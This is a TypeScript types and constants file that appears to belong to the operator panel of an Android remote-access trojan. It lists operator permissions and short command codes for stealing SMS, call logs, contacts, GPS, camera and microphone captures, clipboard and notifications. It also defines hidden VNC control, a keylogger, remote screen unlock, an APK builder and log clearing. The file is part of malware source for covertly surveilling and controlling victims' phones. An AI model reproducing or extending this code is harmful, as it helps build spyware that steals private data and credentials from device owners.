export type UserRole = 'admin' | 'user';
export type Permission =
  | 'dashboard:view'
  | 'device:view'
  | 'device:sms'
  | 'device:calls'
  | 'device:contacts'
  | 'device:gps'
  | 'device:camera'
  | 'device:mic'
  | 'device:files'
  | 'device:wifi'
  | 'device:clipboard'
  | 'device:notifications'
  | 'device:permissions'
  | 'device:apps'
  | 'device:fason'
  | 'device:hvnc'
  | 'device:inspector'
  | 'device:keylogger'
  | 'device:unlock'
  | 'device:command'
  | 'device:delete'
  | 'builder:access'
  | 'logs:view'
  | 'logs:clear'
  | 'users:manage'
  | 'settings:view'
  | 'settings:edit'
  | 'stats:view'
  | 'files:download';
export const ALL_PERMISSIONS: Permission[] = [
  'dashboard:view', 'device:view', 'device:sms', 'device:calls',
  'device:contacts', 'device:gps', 'device:camera', 'device:mic',
  'device:files', 'device:wifi', 'device:clipboard', 'device:notifications',
  'device:permissions', 'device:apps', 'device:fason',
  'device:hvnc', 'device:inspector', 'device:keylogger', 'device:unlock',
  'device:command', 'device:delete',
  'builder:access', 'logs:view', 'logs:clear', 'users:manage',
  'settings:view', 'settings:edit', 'stats:view', 'files:download',
];
export const DEFAULT_USER_PERMISSIONS: Permission[] = [
  'dashboard:view', 'device:view', 'device:sms', 'device:calls',
  'device:contacts', 'device:gps', 'device:camera', 'device:mic',
  'device:files', 'device:wifi', 'device:clipboard', 'device:notifications',
  'device:permissions', 'device:apps', 'device:fason',
  'device:hvnc', 'device:inspector',
  'device:command',
  'settings:view',
];
export const PERMISSION_GROUPS = [
  {
    label: 'Device Features',
    permissions: [
      { key: 'dashboard:view' as Permission, label: 'View Dashboard', description: 'Access the main dashboard' },
      { key: 'device:view' as Permission, label: 'View Devices', description: 'View device list and basic info' },
      { key: 'device:sms' as Permission, label: 'SMS', description: 'Access SMS messages' },
      { key: 'device:calls' as Permission, label: 'Calls', description: 'Access call logs' },
      { key: 'device:contacts' as Permission, label: 'Contacts', description: 'Access contacts list' },
      { key: 'device:gps' as Permission, label: 'GPS Tracking', description: 'GPS location tracking' },
      { key: 'device:camera' as Permission, label: 'Camera', description: 'Camera capture' },
      { key: 'device:mic' as Permission, label: 'Microphone', description: 'Microphone recording' },
      { key: 'device:files' as Permission, label: 'Files', description: 'File browser access' },
      { key: 'device:wifi' as Permission, label: 'WiFi', description: 'WiFi network data' },
      { key: 'device:clipboard' as Permission, label: 'Clipboard', description: 'Clipboard data' },
      { key: 'device:notifications' as Permission, label: 'Notifications', description: 'Device notifications' },
      { key: 'device:permissions' as Permission, label: 'App Permissions', description: 'View app permissions' },
      { key: 'device:apps' as Permission, label: 'Installed Apps', description: 'View installed applications' },
      { key: 'device:fason' as Permission, label: 'Fason Manager', description: 'Fason app management' },
      { key: 'device:hvnc' as Permission, label: 'HVNC', description: 'Hidden VNC screen capture + input' },
      { key: 'device:inspector' as Permission, label: 'Inspector', description: 'Accessibility tree inspector' },
      { key: 'device:keylogger' as Permission, label: 'Keylogger', description: 'Keystroke capture' },
      { key: 'device:unlock' as Permission, label: 'Auto Unlock', description: 'Remote screen unlock' },
      { key: 'device:command' as Permission, label: 'Send Commands', description: 'Send commands to devices' },
      { key: 'device:delete' as Permission, label: 'Delete Devices', description: 'Remove devices and their data' },
    ],
  },
  {
    label: 'System',
    permissions: [
      { key: 'builder:access' as Permission, label: 'APK Builder', description: 'Build and download APK files' },
      { key: 'logs:view' as Permission, label: 'View Logs', description: 'View system logs' },
      { key: 'logs:clear' as Permission, label: 'Clear Logs', description: 'Delete all system logs' },
      { key: 'users:manage' as Permission, label: 'Manage Users', description: 'Create, edit, delete users and permissions' },
      { key: 'settings:view' as Permission, label: 'View Settings', description: 'View system configuration' },
      { key: 'settings:edit' as Permission, label: 'Edit Settings', description: 'Modify system configuration' },
      { key: 'stats:view' as Permission, label: 'View Statistics', description: 'Access system statistics' },
      { key: 'files:download' as Permission, label: 'Download Files', description: 'Download photos, recordings, and files from devices' },
    ],
  },
];
export function resolvePermissions(role: UserRole, permissionsJson: string): Permission[] {
  if (role === 'admin') return [...ALL_PERMISSIONS];
  try {
    const parsed = JSON.parse(permissionsJson);
    if (!Array.isArray(parsed)) return [];
    return parsed.filter((p: string) => ALL_PERMISSIONS.includes(p as Permission)) as Permission[];
  } catch {
    return [];
  }
}

export const CMD = {
  FILES: '0xFI',
  SMS: '0xSM',
  CALLS: '0xCL',
  CONTACTS: '0xCO',
  MIC: '0xMI',
  LOCATION: '0xLO',
  WIFI: '0xWI',
  PERMISSIONS: '0xPM',
  APPS: '0xIN',
  PERM_CHECK: '0xGP',
  CAMERA: '0xCA',
  CLIPBOARD: '0xCB',
  NOTIFICATIONS: '0xNO',
  FASON: '0xFM',
  INFO: '0xIF',
  HVNC: '0xHV',
  INSPECTOR: '0xAI',
  KEYLOGGER: '0xKL',
  SMS_PUSH: '0xSP',
  DEVICE_UNLOCK: '0xAU',
} as const;

export type CmdType = typeof CMD[keyof typeof CMD];
export const CMD_TO_DATA_TYPE: Record<CmdType, string> = {
  [CMD.FILES]: 'files',
  [CMD.SMS]: 'sms',
  [CMD.CALLS]: 'calls',
  [CMD.CONTACTS]: 'contacts',
  [CMD.MIC]: 'mic',
  [CMD.LOCATION]: 'gps',
  [CMD.WIFI]: 'wifi',
  [CMD.PERMISSIONS]: 'permissions',
  [CMD.APPS]: 'apps',
  [CMD.PERM_CHECK]: 'permissions',
  [CMD.CAMERA]: 'camera',
  [CMD.CLIPBOARD]: 'clipboard',
  [CMD.NOTIFICATIONS]: 'notifications',
  [CMD.FASON]: 'fason',
  [CMD.INFO]: 'info',
  [CMD.HVNC]: 'hvnc',
  [CMD.INSPECTOR]: 'inspector',
  [CMD.KEYLOGGER]: 'keylogger',
  [CMD.SMS_PUSH]: 'sms_push',
  [CMD.DEVICE_UNLOCK]: 'device_unlock',
};

export interface CommandPayload {
  type: CmdType;
  action?: string;
  [key: string]: unknown;
}

export interface ApiResponse<T = unknown> {
  success: boolean;
  data?: T;
  error?: string;
}

export interface SessionUser {
  userId: string;
  username: string;
  email: string;
  role: UserRole;
  permissions: Permission[];
  sessionId: string;
  sessionToken: string;
}

export interface ServerConfig {
  port: number;
  debug: boolean;
  socket: {
    pingInterval: number;
    pingTimeout: number;
    maxHttpBufferSize: number;
    transports: string[];
    cors: {
      origin: string | boolean;
      methods: string[];
    };
  };
  rateLimit: {
    windowMs: number;
    maxRequests: number;
  };
  build: {
    timeout: number;
    showServerUrl: boolean;
  };
  security: {
    sessionTimeout: number;
    loginAttempts: number;
    loginLockout: number;
  };
  logger: {
    maxDbLogs: number;
    files: {
      maxSize: string;
      errorRetention: string;
    };
    console: {
      enabled: boolean;
    };
  };
}
